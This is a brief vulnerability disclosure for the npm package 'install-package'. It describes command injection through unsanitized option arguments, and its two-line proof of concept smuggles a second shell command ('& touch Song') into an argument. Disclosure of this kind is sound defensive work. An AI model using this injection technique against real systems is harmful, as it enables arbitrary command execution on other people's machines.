# Overview

`install-package` is a package that installs node modules from JavaScript.

This package is vulnerable to Command Injection, the argument options can be controlled by users without any sanitization giving attackers the ability to execute malicious code.

# POC

```var root = require("install-package");
root("", "& touch Song");
```
